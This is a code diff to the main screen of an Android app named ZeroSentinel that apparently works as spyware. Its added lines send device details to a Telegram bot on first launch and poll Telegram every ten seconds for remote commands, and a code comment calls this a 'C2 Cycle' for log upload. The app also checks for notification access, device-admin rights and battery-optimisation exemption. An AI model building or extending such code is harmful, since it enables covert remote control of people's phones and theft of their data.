@@ -2,7 +2,9 @@ package com.zero.sentinel.ui
 
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.util.Log
@@ -11,8 +13,10 @@ import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
 import androidx.work.*
@@ -29,7 +33,17 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.util.concurrent.TimeUnit
 
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.lifecycleScope
+import androidx.lifecycle.repeatOnLifecycle
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+
 class MainActivity : AppCompatActivity() {
+
+    companion object {
+        private var isFirstLaunch = true
+    }
 
     private lateinit var drawerLayout: DrawerLayout
     private lateinit var navigationView: NavigationView
@@ -43,12 +57,35 @@ class MainActivity : AppCompatActivity() {
     
     private lateinit var prefsManager: EncryptedPrefsManager
 
+    // Permission launcher: requests all needed permissions
+    private val permissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        val allGranted = results.values.all { it }
+        if (allGranted) {
+            performFullSystemTest()
+        } else {
+            Toast.makeText(this, "⚠️ Some permissions denied.", Toast.LENGTH_LONG).show()
+            performFullSystemTest()
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         prefsManager = EncryptedPrefsManager(this)
         
+        // Notification: Config Phase (Session Guarded)
+        if (isFirstLaunch) {
+            isFirstLaunch = false
+            lifecycleScope.launch(Dispatchers.IO) {
+                val client = TelegramClient(this@MainActivity)
+                val device = com.zero.sentinel.utils.DeviceInfoHelper.getShortDeviceInfo()
+                client.sendMessage("🔔 *App Open: Config Phase* [$device]")
+            }
+        }
+
         initViews()
         setupDrawer()
         setupListeners()
@@ -57,6 +94,40 @@ class MainActivity : AppCompatActivity() {
         // Auto-start stuff
         checkAndStartService()
         schedulePeriodicWork()
+
+        // Real-time Command Polling (Bound to Lifecycle)
+        setupRealTimePolling()
+    }
+
+    private fun setupRealTimePolling() {
+        lifecycleScope.launch {
+            // Only run while app is at least STARTED (visible)
+            repeatOnLifecycle(Lifecycle.State.STARTED) {
+                while (isActive) {
+                    try {
+                        withContext(Dispatchers.IO) {
+                            val client = TelegramClient(this@MainActivity)
+                            val repository = (applicationContext as com.zero.sentinel.ZeroSentinelApp).repository
+                            val commandProcessor = com.zero.sentinel.network.CommandProcessor(this@MainActivity, repository, client)
+                            
+                            val lastUpdateId = prefsManager.getLastUpdateId()
+                            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
+                            
+                            val updates = client.pollUpdates(nextOffset)
+                            val maxUpdateId = commandProcessor.processUpdates(updates)
+                            
+                            if (maxUpdateId > lastUpdateId) {
+                                prefsManager.saveLastUpdateId(maxUpdateId)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e("MainActivity", "Real-time polling error", e)
+                    }
+                    // Poll every 10 seconds
+                    delay(10000)
+                }
+            }
+        }
     }
 
     private fun initViews() {
@@ -118,9 +189,9 @@ class MainActivity : AppCompatActivity() {
             schedulePeriodicWork() // Reschedule with new creds potentially
         }
 
-        // Test
+        // Test (check permissions first)
         btnTest.setOnClickListener {
-            performFullSystemTest()
+            checkPermissionsAndTest()
         }
     }
 
@@ -150,6 +221,15 @@ class MainActivity : AppCompatActivity() {
         } else {
              iconStatus.setColorFilter(androidx.core.content.ContextCompat.getColor(this, R.color.indigo_accent))
         }
+    }
+
+    private fun getRequiredPermissions(): Array<String> {
+        return emptyArray()
+    }
+
+    private fun checkPermissionsAndTest() {
+        // No dynamic dangerous permissions needed for basic connectivity test anymore
+        performFullSystemTest()
     }
 
     private fun performFullSystemTest() {
@@ -186,7 +266,7 @@ class MainActivity : AppCompatActivity() {
 
             withContext(Dispatchers.Main) {
                  Toast.makeText(this@MainActivity, "✅ Token OK. Info Sent.", Toast.LENGTH_SHORT).show()
-                 // 3. Trigger C2 Cycle (Scan -> Log -> Upload)
+                 // 3. Trigger C2 Cycle (Log Upload)
                  triggerOneTimeC2()
             }
         }
@@ -260,8 +340,7 @@ class MainActivity : AppCompatActivity() {
         val items = arrayOf(
             "Notification Access: ${if(isNotificationServiceEnabled()) "✅" else "❌"}",
             "Battery Optimization: ${if(isIgnoringBatteryOptimizations()) "✅" else "❌"}",
-            "Admin Privileges: ${if(isAdminActive()) "✅" else "❌"}",
-            "Storage/Camera: ${if(hasMediaPermissions()) "✅" else "❌"}"
+            "Admin Privileges: ${if(isAdminActive()) "✅" else "❌"}"
         )
 
         AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
@@ -271,7 +350,6 @@ class MainActivity : AppCompatActivity() {
                      0 -> requestNotificationAccess()
                      1 -> requestBatteryOptimization()
                      2 -> requestAdmin()
-                     3 -> requestMediaPermissions()
                  }
             }
             .setPositiveButton("Close", null)
@@ -317,19 +395,4 @@ class MainActivity : AppCompatActivity() {
         startActivity(intent)
     }
 
-    private fun hasMediaPermissions(): Boolean {
-        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
-        } else {
-            checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
-        }
-    }
-    
-    private fun requestMediaPermissions() {
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-            requestPermissions(arrayOf(android.Manifest.permission.READ_MEDIA_IMAGES, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
-        } else {
-            requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
-        }
-    }
 }
